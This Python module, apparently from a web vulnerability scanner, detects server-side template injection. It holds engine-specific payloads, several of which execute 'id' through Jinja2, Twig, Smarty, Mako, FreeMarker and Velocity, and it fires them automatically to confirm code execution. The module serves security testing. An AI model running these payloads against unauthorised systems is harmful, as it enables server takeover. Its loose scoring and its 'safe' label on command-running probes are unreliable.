"""
modules/ssti_detector.py - Server-Side Template Injection Detection
Detects SSTI vulnerabilities by testing template syntax.
"""

import re
import time
import logging
import urllib.parse
from typing import Dict, List, Any, Optional
from core.http_engine import HTTPClient
from core.state_manager import StateManager

logger = logging.getLogger("recon.ssti_detector")


class SSTIDetector:
    """
    Detects Server-Side Template Injection (SSTI) vulnerabilities.

    Tests for template injection in parameters that might be rendered server-side:
    - Common template syntax: {{ }}, {{7*7}}, ${7*7}, <%= %>
    - Detect template engine by response patterns
    """

    # SSTI payloads for different template engines
    SSTI_PAYLOADS = {
        "generic": [
            "{{7*7}}",
            "{{7*'7'}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{{'7'*7}}",
            "${{'7'*7}}",
            "@(7*7)",
        ],
        "jinja2": [
            "{{7*'7'}}",
            "{{config}}",
            "{{request}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            # RCE probe (safe - reads /etc/hostname)
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/hostname').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        ],
        "twig": [
            "{{7*'7'}}",
            "{{_self}}",
            "{{_self.env}}",
            # Twig RCE probe
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        "smarty": [
            "{php}echo `id`{/php}",
            "{7*7}",
            "{$smarty.template_object}",
            "{system('id')}",
        ],
        "mako": [
            "${7*7}",
            "${dir}",
            # Mako RCE
            "${__import__('os').popen('id').read()}",
        ],
        "freemarker": [
            "${7*7}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ],
        "velocity": [
            "#set($x=7*7)${x}",
            "#set($rt=$class.forName('java.lang.Runtime'))${rt.exec('id')}",
        ],
        "pebble": [
            "{{7*7}}",
            "{%for i in range(3)%}{{i}}{%endfor%}",
        ],
    }

    # Time-based SSTI payloads (detect via response delay)
    TIME_BASED_PAYLOADS = [
        ("{{range(10000)|join}}", 2.0),        # Jinja2 slow computation
        ("${(0..9999).join('')}", 2.0),         # Mako
        ("#foreach($i in [1..9999])x#end", 2.0), # Velocity
    ]

    SSTI_PARAM_NAMES = {
        "template",
        "tmpl",
        "view",
        "render",
        "output",
        "format",
        "page",
        "content",
        "data",
        "input",
        "q",
        "search",
        "query",
        "name",
        "dest",
        "redirect",
        "url",
        "next",
        "file",
        "path",
        "template_name",
        "template_param",
        "view_param",
        "style",
        "config",
        "setting",
        "lang",
        "language",
        "subject",
        "email",
    }

    def __init__(self, state: StateManager = None, http_client: HTTPClient = None):
        self.state = state
        self.http_client = http_client or HTTPClient()
        self.findings = []

    def detect(self, endpoints: List[Any], progress_cb=None) -> Dict[str, Any]:
        """
        Scan endpoints for SSTI vulnerabilities.

        Args:
            endpoints: List of endpoint dicts or URLs
            progress_cb: Optional progress callback

        Returns:
            Dict with vulnerabilities and metadata
        """
        logger.info(f"[SSTI] Starting SSTI detection on {len(endpoints)} endpoints")

        results = {
            "vulnerabilities": [],
            "endpoints_tested": 0,
            "ssti_confirmed": 0,
        }

        for i, endpoint in enumerate(endpoints):
            if progress_cb:
                progress_cb(i, len(endpoints))

            if isinstance(endpoint, dict):
                url = endpoint.get("url") or endpoint.get("endpoint")
                raw_params = endpoint.get("parameters") or endpoint.get("query_params") or []
                if isinstance(raw_params, dict):
                    params = list(raw_params.keys())
                else:
                    params = list(raw_params)
            else:
                url = str(endpoint)
                params = []

            if not url:
                continue

            # Check URL params for SSTI-susceptible names
            parsed = urllib.parse.urlparse(url)
            url_params = list(urllib.parse.parse_qs(parsed.query).keys())

            # Combine endpoint params with URL params
            all_params = list(set(params + url_params))

            # Check each SSTI-susceptible parameter
            for param in all_params:
                if param.lower() in self.SSTI_PARAM_NAMES:
                    ssti_result = self._test_ssti(url, param)
                    if ssti_result.get("vulnerable"):
                        results["vulnerabilities"].append(ssti_result)
                        results["ssti_confirmed"] += 1

            results["endpoints_tested"] += 1

        logger.info(f"[SSTI] Found {results['ssti_confirmed']} SSTI vulnerabilities")
        return results

    def _test_ssti(self, url: str, param: str) -> Dict[str, Any]:
        """Test a specific parameter for SSTI"""
        result = {
            "url": url,
            "parameter": param,
            "vulnerable": False,
            "confidence": 0.0,
            "template_engine": None,
            "evidence": [],
            "payloads_tested": 0,
        }

        # Get baseline response
        baseline_url = self._inject_param(url, param, "test123")
        try:
            baseline_resp = self.http_client.get(baseline_url, timeout=10)
            baseline_text = baseline_resp.text
        except:
            baseline_text = ""

        # Test generic payloads first
        for payload in self.SSTI_PAYLOADS["generic"]:
            result["payloads_tested"] += 1
            try:
                test_url = self._inject_param(url, param, payload)
                response = self.http_client.get(test_url, timeout=10)

                # Check for SSTI indicators
                indicators = self._check_ssti_indicators(
                    response.text, baseline_text, payload
                )

                if indicators["score"] > 0.4:
                    result["vulnerable"] = True
                    result["confidence"] = indicators["score"]
                    result["template_engine"] = indicators.get("engine")
                    result["evidence"].append(
                        {
                            "payload": payload,
                            "indicator": indicators["reason"],
                        }
                    )

                    if result["confidence"] >= 0.8:
                        # Try to confirm with engine-specific RCE
                        engine = result.get("template_engine")
                        if engine:
                            rce_result = self._attempt_rce_confirmation(url, param, engine)
                            if rce_result:
                                result["rce_confirmed"] = True
                                result["rce_evidence"] = rce_result
                                result["confidence"] = 0.98
                                result["severity"] = "CRITICAL"
                        break

            except Exception as e:
                logger.debug(f"[SSTI] Error testing {param} on {url}: {e}")
                continue

        # If not yet confirmed, try time-based detection
        if not result["vulnerable"]:
            time_result = self._test_time_based_ssti(url, param, baseline_text)
            if time_result:
                result.update(time_result)

        return result

    def _attempt_rce_confirmation(
        self, url: str, param: str, engine: str
    ) -> Optional[Dict[str, Any]]:
        """Attempt to confirm RCE via safe read (/etc/hostname)."""
        engine_key = engine.split("/")[0].lower().strip()
        rce_payloads = self.SSTI_PAYLOADS.get(engine_key, [])

        # Filter for payloads that look like RCE (contain os/popen/exec/id)
        rce_payloads = [p for p in rce_payloads
                        if any(k in p for k in ["popen", "exec", "system", "os.", "read()"])]

        for payload in rce_payloads[:3]:
            try:
                test_url = self._inject_param(url, param, payload)
                response = self.http_client.get(test_url, timeout=12)
                text = response.text if hasattr(response, "text") else ""

                # Check for command execution output
                rce_patterns = [
                    (r"uid=\d+\(.+\)\s+gid=", "id command executed"),
                    (r"root|www-data|apache|nginx", "system user in output"),
                    (r"[a-zA-Z0-9\-]+\.[a-zA-Z]+\n", "hostname revealed"),
                    (r"Linux|Darwin|FreeBSD", "OS banner in output"),
                ]
                for pattern, label in rce_patterns:
                    if re.search(pattern, text):
                        return {
                            "payload": payload,
                            "engine": engine_key,
                            "output_snippet": text[:200],
                            "confirmed_via": label,
                        }
            except Exception as e:
                logger.debug(f"[SSTI] RCE confirmation error: {e}")
                continue
        return None

    def _test_time_based_ssti(
        self, url: str, param: str, baseline_text: str
    ) -> Optional[Dict[str, Any]]:
        """Test SSTI via response time (for blind contexts)."""
        try:
            # Get baseline time
            t0 = time.time()
            baseline_url = self._inject_param(url, param, "normalinput")
            self.http_client.get(baseline_url, timeout=10)
            baseline_time = time.time() - t0
        except Exception:
            return None

        for payload, expected_delay in self.TIME_BASED_PAYLOADS:
            try:
                test_url = self._inject_param(url, param, payload)
                t0 = time.time()
                self.http_client.get(test_url, timeout=15)
                elapsed = time.time() - t0

                if elapsed > baseline_time + expected_delay:
                    return {
                        "vulnerable": True,
                        "confidence": 0.65,
                        "template_engine": "unknown (time-based)",
                        "evidence": [{
                            "payload": payload,
                            "indicator": f"Response delayed {elapsed:.1f}s vs baseline {baseline_time:.1f}s",
                        }],
                    }
            except Exception as e:
                logger.debug(f"[SSTI] Time-based test error: {e}")

        return None

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject a payload into the parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)

        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _check_ssti_indicators(
        self, response_text: str, baseline: str, payload: str
    ) -> Dict[str, Any]:
        """Check response for SSTI indicators"""
        score = 0.0
        reason = ""
        engine = None

        # Check if payload is reflected
        if payload in response_text:
            score += 0.3
            reason = "Payload reflected"

        # Check for math result (e.g., 49 for {{7*7}})
        math_indicators = {
            "49": "jinja2/mako",
            "777": "handlebars",
            "aaaaa": "freemarker",
        }

        for result, eng in math_indicators.items():
            if result in response_text and "7" in payload:
                score += 0.4
                reason = f"Math evaluation detected (template engine: {eng})"
                engine = eng
                break

        # Check for template syntax errors revealing engine
        if any(
            x in response_text.lower()
            for x in [
                "jinja2",
                "django",
                "mako",
                "smarty",
                "twig",
                "freemarker",
                "velocity",
            ]
        ):
            score += 0.3
            reason = reason or "Template engine error message"
            engine = engine or "unknown"

        # Check for code execution artifacts
        if any(
            x in response_text
            for x in ["/bin/", "uid=", "root:", "www-data", "python", "ruby"]
        ):
            score += 0.5
            reason = "Command execution output detected"
            engine = engine or "RCE via SSTI"

        # Check for special characters handling differences
        if baseline != response_text and "error" not in response_text.lower():
            # Response changed without error - could be template processing
            score += 0.1

        return {"score": min(score, 1.0), "reason": reason, "engine": engine}


def detect_ssti(
    state: StateManager, endpoints: List[Any], progress_cb=None
) -> Dict[str, Any]:
    """Standalone function for SSTI detection"""
    detector = SSTIDetector(state=state)
    return detector.detect(endpoints, progress_cb)
